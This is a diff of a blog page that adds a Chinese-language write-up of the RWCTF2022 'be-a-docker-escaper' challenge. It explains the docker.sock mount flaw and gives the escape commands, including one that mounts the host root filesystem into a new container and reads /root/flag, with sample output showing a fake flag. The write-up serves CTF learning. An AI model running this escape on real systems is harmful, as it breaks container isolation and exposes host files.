@@ -20,15 +20,22 @@
     var CONFIG = {"hostname":"cynosure.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta property="og:type" content="article">
+  <meta name="description" content="RWCTF2022 体验赛上没有做出来的 docker 逃逸题目，在这里复现并记录一下">
+<meta property="og:type" content="article">
 <meta property="og:title" content="RWCTF2022 be-a-docker-escaper">
 <meta property="og:url" content="http://cynosure.github.io/Cynosure.github.io/2022/01/25/RWCTF2022-be-a-docker-escaper/index.html">
 <meta property="og:site_name" content="Cynosure&#39;s Blog">
+<meta property="og:description" content="RWCTF2022 体验赛上没有做出来的 docker 逃逸题目，在这里复现并记录一下">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/CynosureSec/Imagebed/main/img/20220127002559.png">
 <meta property="article:published_time" content="2022-01-25T17:30:20.000Z">
-<meta property="article:modified_time" content="2022-01-26T08:52:14.719Z">
+<meta property="article:modified_time" content="2022-01-26T16:51:43.083Z">
 <meta property="article:author" content="Cynosure">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="RW">
+<meta property="article:tag" content="docker">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/CynosureSec/Imagebed/main/img/20220127002559.png">
 
 <link rel="canonical" href="http://cynosure.github.io/Cynosure.github.io/2022/01/25/RWCTF2022-be-a-docker-escaper/">
 
@@ -198,7 +205,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-01-26 00:52:14" itemprop="dateModified" datetime="2022-01-26T00:52:14-08:00">2022-01-26</time>
+                <time title="Modified: 2022-01-26 08:51:43" itemprop="dateModified" datetime="2022-01-26T08:51:43-08:00">2022-01-26</time>
               </span>
 
           
@@ -212,7 +219,63 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        
+        <p><img src="https://raw.githubusercontent.com/CynosureSec/Imagebed/main/img/20220127002559.png"></p>
+<p>RWCTF2022 体验赛上没有做出来的 docker 逃逸题目，在这里复现并记录一下</p>
+<span id="more"></span>
+<h2 id="文件认识"><a href="#文件认识" class="headerlink" title="文件认识"></a>文件认识</h2><p>这题看题目就知道是一个 <code>docker</code> 逃逸的题目，但是它给的文件中除了一个 <code>Dockerfile</code> 外还有 <code>user-data</code> 文件夹，最开始我看这题的时候，通过阅读 <code>dockerfile</code> 知道它创建了一个 <code>docker</code> 容器，然后在 <code>docker</code> 容器里创建了一个 <code>qemu</code> 虚拟机 ，最后在 <code>qemu</code> 虚拟机里又 起了一个 <code>docker</code> 容器，将最后的这个 <code>docker</code> 容器的 <code>ssh</code> 通过 <code>5555</code> 端口映射出来，到最初 <code>docker</code> 容器里。这个流程我看得十分复杂，想着先按照它所给的 <code>Dockerfile</code> 创建一个与题目环境相同的环境，再去做题，并且这题的题目是 <code>docker</code> 逃逸，所以我也一直没有弄清楚，它想逃逸的究竟的哪个 <code>docker</code> 环境。现在再仔细阅读题目所给的文件，并且通过网络上的 <code>writeup</code> 帮助理解，最终弄清楚了这题的漏洞点与如何做这道题，与搭建调试环境。</p>
+<p>首先是 <strong>Dockerfile</strong> 文件</p>
+<p>通过 <code>apt</code> 安装 <code>tzdata</code> <code>ca-certificates</code> <code>wget</code> <code>qemu-system</code> <code>cloud-image-utils</code> <code>python3</code></p>
+<p>并且下载 <code>focal-server-cloudimg-amd64.img</code> 镜像</p>
+<p>根据 <code>user-data</code> 配置文件 以及我们所下载的镜像，重新配置一个新的镜像，这样通过这个镜像启动的系统，会根据我们的配置文件，提前就配置好用户名，密码，软件包，内部文件等等</p>
+<figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="bash"> DEBIAN_FRONTEND=<span class="string">&quot;noninteractive&quot;</span> apt-get -y install tzdata ca-certificates wget qemu-system cloud-image-utils python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> mkdir /home/chall</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /home/chall</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> wget http://cloud-images.ubuntu.com/focal/current/focal-server-cloudimg-amd64.img</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> ./user-data /home/chall/</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> ./check.py /home/chall/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> cloud-localds user-data.img user-data &amp;&amp; \</span></span><br><span class="line"><span class="bash">    qemu-img resize focal-server-cloudimg-amd64.img +20G</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>现在来看 Dockerfile 中 qemu 虚拟机启动的部分</p>
+<p>这里一共有两条运行了 <code>qemu-system-x86_64</code> 命令，<code>CMD</code> 命令后跟的命令是在容器启动后才会运行的命令，所以我们只关注着一条，它通过 <code>qemu</code> 启动了我们刚才制作好的镜像，并且运行它</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">RUN qemu-system-x86_64 \</span><br><span class="line">  -drive <span class="string">&quot;file=focal-server-cloudimg-amd64.img,format=qcow2&quot;</span> \</span><br><span class="line">  -drive <span class="string">&quot;file=user-data.img,format=raw&quot;</span> \</span><br><span class="line">  -device rtl8139,netdev=net0 \</span><br><span class="line">  -m 8G \</span><br><span class="line">  -netdev user,id=net0 \</span><br><span class="line">  -smp 4 \</span><br><span class="line">  -nographic</span><br><span class="line"></span><br><span class="line">EXPOSE 5555</span><br><span class="line"></span><br><span class="line">CMD qemu-system-x86_64 \</span><br><span class="line">  -drive <span class="string">&quot;file=focal-server-cloudimg-amd64.img,format=qcow2&quot;</span> \</span><br><span class="line">  -device rtl8139,netdev=net0 \</span><br><span class="line">  -m 1G \</span><br><span class="line">  -netdev user,id=net0,hostfwd=tcp::5555-:22 \</span><br><span class="line">  -smp 2 \</span><br><span class="line">  -nographic</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>接着来看 <strong>user-data</strong> 文件</p>
+<p>这个文件中我们需要关注的代码如下</p>
+<p><code>apt</code> 部分 给 <code>apt</code> 换源</p>
+<p><code>packages</code> 部分 下载了 <code>docker.io</code> <code>openssh-server</code> 两个软件包</p>
+<p>设置了一个名叫 <code>container</code> 的用户，并且给他配置了 <code>ssh</code> 公钥，私钥在解压题目所给文件时已经给我们了</p>
+<p>当进入这个用户时就会启动 <code>/home/container/run.sh</code> 这个脚本</p>
+<p>并且拉取了 <code>docker</code> 中的 <code>ubuntu</code> 镜像</p>
+<p><code>write_files</code> 部分 创建了 <code>/home/container/run.sh</code> 文件 往里面写入 <code>docker run -i -m 128m -v /var/run/docker.sock:/s ubuntu</code> 命令，并且这个文件是我们 ssh 连接上来时就会执行的命令</p>
+<p>创建了 <code>/root/flag</code> 文件 往里面写入 <code>rwctf&#123;THIS_IS_A_TEST_FLAG&#125;</code> 这个 flag 是一个假的 flag 但是在远程环境上，这个就应该是题目的 flag 了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">apt:</span><br><span class="line">  primary:</span><br><span class="line">    - arches: [default]</span><br><span class="line">      uri: http://mirrors.aliyun.com/ubuntu/</span><br><span class="line">      search:</span><br><span class="line">        - http://mirrors.aliyun.com/ubuntu/</span><br><span class="line"></span><br><span class="line">packages:</span><br><span class="line">  - docker.io</span><br><span class="line">  - openssh-server</span><br><span class="line"></span><br><span class="line">groups:</span><br><span class="line">  - docker</span><br><span class="line"></span><br><span class="line">users:</span><br><span class="line">  <span class="comment">#- name: root</span></span><br><span class="line">  <span class="comment">#  ssh_authorized_keys:</span></span><br><span class="line">  <span class="comment">#    - &quot;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEbCiWqn8LWe1Btot7vOTchv5MYfTaE8yHShPI6RP+Rx&quot;</span></span><br><span class="line">  - name: container</span><br><span class="line">    groups: docker</span><br><span class="line">    ssh_authorized_keys:</span><br><span class="line">      - <span class="string">&quot;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEbCiWqn8LWe1Btot7vOTchv5MYfTaE8yHShPI6RP+Rx&quot;</span></span><br><span class="line">    shell: /home/container/run.sh</span><br><span class="line"></span><br><span class="line">write_files:</span><br><span class="line">  - content: |</span><br><span class="line">      <span class="comment">#!/bin/bash</span></span><br><span class="line">      docker run -i -m 128m -v /var/run/docker.sock:/s ubuntu <span class="comment"># You are here!</span></span><br><span class="line">    path: /home/container/run.sh</span><br><span class="line">    permissions: <span class="string">&quot;0755&quot;</span></span><br><span class="line">  - content: |</span><br><span class="line">      rwctf&#123;THIS_IS_A_TEST_FLAG&#125;</span><br><span class="line">    permissions: <span class="string">&quot;0000&quot;</span></span><br><span class="line">    path: /root/flag</span><br><span class="line">  - content: |</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://docker.mirrors.ustc.edu.cn&quot;</span>]</span><br><span class="line">      &#125;</span><br><span class="line">    path: /etc/docker/daemon.json</span><br><span class="line"></span><br><span class="line">runcmd:</span><br><span class="line">  - docker pull ubuntu</span><br></pre></td></tr></table></figure>
+
+<p>所以这道题最后 我们应该是要获取 <code>qemu</code> 运行的系统中的 <code>flag</code> 文件，并且 <code>ssh</code> 连接上去得到的 <code>shell</code> 是在 <code>qemu</code> 运行系统的 <code>docker</code> 容器中，并且不是一个 <code>root</code> 用户</p>
+<h2 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h2><p>这题的漏洞点 在 <code>run.sh</code> 中 在启动 <code>docker</code> 容器时 使用了 <code> -v /var/run/docker.sock:/s</code> 参数将系统中的 <code>/var/run/docker.sock</code> 文件挂载到容器中 <code>/s</code> 文件。</p>
+<p>先来说说 <code>docker.sock</code> 这个文件是什么。</p>
+<p>摘录至网上</p>
+<blockquote>
+<p>The docker.sock is a default UNIX socket. Sockets are the communication between localhost and processes. Docker default listens to a docker.sock. If your running in localhost then you can use /var/run/docker.sock method to manage containers.</p>
+</blockquote>
+<p><code>docker.sock</code> 这个文件就是 <code>UNIX</code> 的一个接口，这个接口用于系统与进程的通信， <code>docker</code> 会默认监听这个接口，当我们运行 <code>docker</code> 的命令时候就会通过这个接口去管理 <code>docker</code> 的容器</p>
+<p>所以我们将这个文件挂载进了一个容器中，在这个容器中我们就可以通过与这个文件通信，来运行 <code>dokcer</code> 中的一些命令，甚至于是创建新容器，并且将系统中的任意目录挂载到我们新创建的容器中，通过读取或修改新创建的容器中的文件，我们就可以读取或修改原来主机的文件，也就达到了逃逸的目的。</p>
+<p>将 <code>docker.sock</code> 挂载进容器中并不是一件少见的事，比如我们需要在容器中创建新的 <code>docker</code> 容器，那么这样做就可以减少 docker daemon 带来的性能损失。</p>
+<p>使用HTTP请求通过docker.sock发送给Docker daemon，使用它，我们就可以运行一些能够管理Docker的Docker容器，比如Portainer、Kubernetes</p>
+<h2 id="调试部分"><a href="#调试部分" class="headerlink" title="调试部分"></a>调试部分</h2><p>首先我们使用 <code>docker run -ti --rm -v /var/run/docker.sock:/var/run/docker.sock docker</code> 命令创建一个新 环境为 dokcer 的容器，并且将 docker.sock 挂载到我们新创建容器的相同目录下</p>
+<p>在容器里运行 <code>docker ps -a</code> 命令 发现我们得到的结果，与直接在主机里运行相同命令得到的结果是一样的，说明这个容器具有了主机里执行 docker 命令的权限</p>
+<blockquote>
+<p>❯ docker run -ti –rm -v /var/run/docker.sock:/var/run/docker.sock docker<br>Unable to find image ‘docker:latest’ locally<br>latest: Pulling from library/docker<br>59bf1c3509f3: Pull complete<br>1ea03e1895df: Pull complete<br>1ff98835b055: Pull complete<br>a3f2dd7b7d65: Pull complete<br>d182b62d4a35: Pull complete<br>d7a57db2abd7: Pull complete<br>73490af52bd3: Pull complete<br>Digest: sha256:a729cce205a05b0b86dc8dca87823efaffc3f74979fe7dc86a707c2fbf631b61<br>Status: Downloaded newer image for docker:latest<br>/ # docker ps -a<br>CONTAINER ID   IMAGE                COMMAND                  CREATED          STATUS                    PORTS                                       NAMES<br>2f40d03d8fc3   docker               “docker-entrypoint.s…”   57 seconds ago   Up 56 seconds                                                         xenodochial_bhabha<br>9215e824d67d   ba6acccedd29         “/bin/bash”              23 hours ago     Up 23 hours               0.0.0.0:5212-&gt;5212/tcp, :::5212-&gt;5212/tcp   clodreve<br>c6b99ec4c62c   ctf_go_v1            “/bin/bash”              31 hours ago     Up 31 hours               0.0.0.0:8080-&gt;8080/tcp, :::8080-&gt;8080/tcp   sleepy_mcnulty<br>bd69b801183e   docker_escape:v1.0   “/bin/bash”              4 days ago       Exited (0) 31 hours ago                                               dreamy_tu<br>daeae829770c   1c4cc47f56e3         “/start.sh”              4 weeks ago      Up 3 weeks                0.0.0.0:1234-&gt;9999/tcp                      peaceful_varahamihira<br>/ #</p>
+</blockquote>
+<p>然后对于与题目部分相同的环境，我们可以使用命令 <code>docker run -i -v /var/run/docker.sock:/s ubuntu:20.04</code> 创建一个容器</p>
+<p>然后通过对映射文件<code>/s</code>的 docker 命令的操作，我们可以创建新容器，将目录映射到新容器，然后就可以输出 flag 了</p>
+<p>命令如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sed -i &quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.aliyun.com/g&quot; /etc/apt/sources.list</span><br><span class="line">apt update</span><br><span class="line">apt install -y docker.io</span><br><span class="line">docker -H unix:///s run --rm -v /:/r ubuntu:20.04 cat /r/root/flag</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>docker -H unix:///s run –rm -v /:/r ubuntu:20.04 cat /r/root/flag<br>ea362f368469: Verifying Checksum<br>ea362f368469: Download complete<br>ea362f368469: Pull complete<br>Digest: sha256:b5a61709a9a44284d88fb12e5c48db0409cfad5b69d4ff8224077c57302df9cf<br>Status: Downloaded newer image for ubuntu:latest<br>flag{This_is_a_fake_flag}</p>
+</blockquote>
+<p>通过运行结果可以发现输出了我们设置的 fake flag</p>
+<p><strong>参考资料:</strong></p>
+<p>rwctf2022体验赛 debugger &amp; docker<br><a target="_blank" rel="noopener" href="https://lingze.xyz/pages/c796d2/#be-a-docker-escaper">https://lingze.xyz/pages/c796d2/#be-a-docker-escaper</a></p>
+<p>Docker escape<br><a target="_blank" rel="noopener" href="https://z3ratu1.github.io/Docker%20Escape.html">https://z3ratu1.github.io/Docker%20Escape.html</a></p>
+<p>Run Docker In Docker<br><a target="_blank" rel="noopener" href="https://vinodhakumara2681997.medium.com/run-docker-in-docker-42f381fe6b4f">https://vinodhakumara2681997.medium.com/run-docker-in-docker-42f381fe6b4f</a></p>
+<p>Docker-in-Docker vs Docker-out-of-Docker<br><a target="_blank" rel="noopener" href="http://tdongsi.github.io/blog/2017/04/23/docker-out-of-docker/">http://tdongsi.github.io/blog/2017/04/23/docker-out-of-docker/</a></p>
+<p>Docker Tips : about /var/run/docker.sock<br><a target="_blank" rel="noopener" href="https://betterprogramming.pub/about-var-run-docker-sock-3bfd276e12fd">https://betterprogramming.pub/about-var-run-docker-sock-3bfd276e12fd</a></p>
+
     </div>
 
     
@@ -220,6 +283,11 @@
     
 
       <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/RW/" rel="tag"># RW</a>
+              <a href="/tags/docker/" rel="tag"># docker</a>
+          </div>
 
         
 
@@ -292,6 +360,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E8%AE%A4%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">文件认识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">漏洞点分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E9%83%A8%E5%88%86"><span class="nav-number">3.</span> <span class="nav-text">调试部分</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -312,7 +381,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-count">5</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
